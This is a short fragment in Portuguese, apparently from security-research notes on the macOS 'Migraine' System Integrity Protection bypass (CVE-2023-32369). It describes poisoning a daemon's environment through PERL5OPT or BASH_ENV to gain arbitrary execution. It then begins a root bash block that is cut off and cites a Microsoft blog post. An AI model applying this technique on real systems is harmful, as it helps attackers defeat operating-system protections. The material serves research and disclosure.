...
```
Como o Perl respeita `PERL5OPT` (e o Bash respeita `BASH_ENV`), envenenar o *ambiente* do daemon é suficiente para obter execução arbitrária em um contexto sem SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
...
- [1] [Microsoft Security Blog – Nova vulnerabilidade do macOS, Migraine, pode contornar a System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
